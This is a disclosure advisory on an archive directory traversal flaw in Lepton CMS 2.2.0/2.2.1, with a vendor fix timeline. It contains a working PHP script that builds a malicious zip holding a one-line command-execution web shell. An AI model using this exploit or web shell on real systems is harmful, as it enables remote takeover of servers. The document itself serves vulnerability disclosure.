@@ -1,0 +1,98 @@
+[+] Credits: John Page (HYP3RLINX)
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/LEPTON-ARCHIVE-DIRECTORY-TRAVERSAL.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+==================
+www.lepton-cms.org
+
+
+Product:
+=================================
+Lepton CMS 2.2.0 / 2.2.1 (update)
+
+LEPTON is an easy-to-use but full customizable Content Management System (CMS).
+
+
+Vulnerability Type:
+============================
+Archive Directory Traversal 
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+Lepton has feature that lets users install new modules, if malicious user uploads an archive and the module is not valid it
+will generate an error. However, the malicious archive will still get decompressed and no check is made for ../ characters in
+the file name allowing in arbitrary PHP files to be placed outside the intended target directory for installed modules. This can
+then be used to execute remote commands on the affected host system. 
+
+e.g.
+
+We get error message as below.
+
+under "Add Ons" tab Install Module.
+Invalid LEPTON installation file. Please check the *.zip format.[1]
+
+Archive still gets decompressed and the malicious file is moved outside of the intended target directory, by using ../ in file name.
+
+
+Exploit code(s):
+===============
+
+<?php
+#Archive Directory Traversal to RCE exploit 
+#==============================================
+
+if($argc<2){echo "Usage: <filename>";exit();}
+$file_name=$argv[1];
+
+$zip = new ZipArchive();
+$res = $zip->open("$file_name.zip", ZipArchive::CREATE);
+$zip->addFromString("..\..\..\..\..\..\..\..\RCE.php", '<?php exec($_GET["cmd"]); ?>');
+$zip->close();
+
+echo "Malicious archive created...\r\n";
+echo "========= hyp3rlinx ============";
+?>
+
+
+Disclosure Timeline:
+===========================================================
+Attempted Vendor Notification: June 11, 2016 (No replies)
+Vendor Notification on July 12, 2016 ( thanks Henri Salo )
+Vendor Acknowledgement: July 13, 2016
+Vendor fixes: July 14, 2016
+Vendor release version 2.2.2 : August 12, 2016
+August 15, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+================
+High
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
